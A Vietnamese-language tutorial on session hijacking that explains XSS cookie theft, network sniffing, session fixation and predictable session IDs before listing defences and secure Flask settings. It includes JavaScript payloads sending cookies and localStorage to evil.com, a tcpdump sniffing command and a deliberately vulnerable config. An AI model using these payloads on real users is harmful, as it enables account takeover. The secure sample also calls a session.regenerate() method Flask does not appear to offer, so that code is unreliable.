# Session Hijacking

> **OWASP Top 10:2025**: A07:2025 – Authentication Failures | **CWE**: CWE-384 | **Nguồn**: PortSwigger, OWASP, CWE MITRE

## 🧱 Kiến thức Nền tảng

HTTP là giao thức stateless — mỗi request độc lập, server không tự nhớ ai đã gửi request trước đó. Để duy trì trạng thái đăng nhập, web application sử dụng **session**: sau khi user đăng nhập thành công, server tạo một session ID ngẫu nhiên, lưu ở phía server (database, memory, Redis), và gửi session ID đó cho browser qua cookie.

Mỗi request tiếp theo, browser tự động gửi kèm cookie chứa session ID. Server tra cứu session ID để biết user là ai và có quyền gì. Session ID chính là "chìa khóa" — ai có session ID hợp lệ, người đó được coi là user đã đăng nhập.

```python
# Normal session management flow
from flask import Flask, session
import secrets

app = Flask(__name__)
app.secret_key = secrets.token_hex(32)  # 256-bit random secret

@app.route('/login', methods=['POST'])
def login():
    user = authenticate(request.form['username'], request.form['password'])
    if user:
        # Regenerate session ID after login to prevent fixation
        session.regenerate()
        session['user_id'] = user.id
        session['login_time'] = datetime.utcnow().isoformat()
        session['ip'] = request.remote_addr
        
        # Cookie sent with security flags
        response = redirect('/dashboard')
        return response
    return "Invalid credentials", 401
```

Session ID phải đủ dài (128-bit trở lên), ngẫu nhiên (dùng CSPRNG), và được bảo vệ bởi các cookie flags. Nếu attacker đánh cắp được session ID, họ có thể mạo danh user mà không cần biết mật khẩu.

## 🔍 Mô tả lỗ hổng

Session hijacking là kỹ thuật đánh cắp hoặc giả mạo session ID của user hợp lệ để chiếm quyền truy cập. Các vector tấn công bao gồm: XSS-based cookie theft (đánh cắp qua JavaScript), network sniffing (nghe lén trên mạng không mã hóa), session prediction (đoán session ID có quy luật), và session fixation (ép user dùng session ID do attacker chọn).

## ⚔️ Cơ chế tấn công

**1. XSS-based Session Theft — đánh cắp cookie qua JavaScript:**

```html
<!-- Attacker injects this script via stored XSS -->
<script>
// Steal session cookie and send to attacker's server
var img = new Image();
img.src = 'https://evil.com/steal?cookie=' + encodeURIComponent(document.cookie);
</script>

<!-- More stealthy: using fetch API -->
<script>
fetch('https://evil.com/collect', {
    method: 'POST',
    body: JSON.stringify({
        cookies: document.cookie,
        url: window.location.href,
        localStorage: JSON.stringify(localStorage)
    })
});
</script>
```

**2. Network Sniffing — nghe lén trên HTTP không mã hóa:**

```bash
# Attacker on same network (coffee shop WiFi) uses tcpdump
sudo tcpdump -i wlan0 -A -s 0 'port 80 and (host target.com)'

# Or using Wireshark filter to capture session cookies:
# http.cookie contains "session"

# Captured: Cookie: session=abc123def456
# Attacker replays cookie in their browser to hijack session
```

**3. Session Fixation — ép nạn nhân dùng session ID đã biết:**

```
// Step 1: Attacker gets a valid session ID from target site
GET /login HTTP/1.1
Response: Set-Cookie: SESSIONID=attacker_known_id

// Step 2: Attacker sends victim a link with fixed session
https://target.com/login?SESSIONID=attacker_known_id

// Step 3: Victim logs in using attacker's session ID
// Step 4: Attacker uses the SAME session ID — now authenticated as victim
```

**4. Predictable Session IDs:**

```python
# VULNERABLE: predictable session ID generation
import time, hashlib

def generate_session_id(username):
    # Session based on timestamp + username — attacker can guess
    raw = f"{username}{int(time.time())}"
    return hashlib.md5(raw.encode()).hexdigest()

# Attacker knows username "admin" and approximate login time
# Can brute-force a few hundred MD5 hashes to find the session
```

## 🛡️ Biện pháp phòng thủ

1. **Cookie security flags**: Luôn set `HttpOnly` (chặn JavaScript đọc), `Secure` (chỉ gửi qua HTTPS), và `SameSite=Strict` (chặn CSRF).
2. **Session regeneration**: Tạo session ID mới sau khi đăng nhập (chống fixation) và sau mỗi thay đổi quyền.
3. **HTTPS everywhere**: Buộc toàn bộ traffic qua HTTPS với HSTS header để chống network sniffing.
4. **Session binding**: Gắn session với IP và User-Agent, cảnh báo khi phát hiện thay đổi bất thường.
5. **Cryptographic session IDs**: Dùng CSPRNG (Cryptographically Secure Pseudo-Random Number Generator) để tạo session ID 128-bit trở lên.

## 💻 Code Example

```python
# VULNERABLE: no cookie flags, predictable session, no regeneration
app.config['SESSION_COOKIE_HTTPONLY'] = False   # JS can read cookie
app.config['SESSION_COOKIE_SECURE'] = False     # Sent over HTTP
app.config['SESSION_COOKIE_SAMESITE'] = None    # No CSRF protection

@app.route('/login', methods=['POST'])
def login_unsafe():
    user = authenticate(request.form['username'], request.form['password'])
    if user:
        # No session regeneration — fixation possible
        session['user_id'] = user.id
        return redirect('/dashboard')
    return "Failed", 401
```

```python
# SECURE: proper cookie flags, session regeneration, binding
app.config.update(
    SESSION_COOKIE_HTTPONLY=True,       # Block JavaScript access
    SESSION_COOKIE_SECURE=True,        # HTTPS only
    SESSION_COOKIE_SAMESITE='Strict',  # Prevent cross-site sending
    PERMANENT_SESSION_LIFETIME=1800,   # 30 minutes timeout
    SESSION_COOKIE_NAME='__Host-sid'   # Cookie prefix for extra security
)

@app.route('/login', methods=['POST'])
def login_safe():
    user = authenticate(request.form['username'], request.form['password'])
    if user:
        # Regenerate session ID to prevent fixation
        session.clear()
        session.regenerate()
        
        session['user_id'] = user.id
        session['ip'] = request.remote_addr
        session['ua'] = request.headers.get('User-Agent')
        session['created'] = datetime.utcnow().isoformat()
        
        return redirect('/dashboard')
    return "Invalid credentials", 401

@app.before_request
def validate_session():
    if 'user_id' in session:
        # Detect session anomalies (IP or User-Agent change)
        if session.get('ip') != request.remote_addr:
            session.clear()
            return redirect('/login?reason=session_anomaly')
```

## 📚 Nguồn tham khảo
- PortSwigger: https://portswigger.net/web-security/authentication/session-management
- OWASP: https://owasp.org/www-community/attacks/Session_hijacking_attack
- CWE: https://cwe.mitre.org/data/definitions/384.html
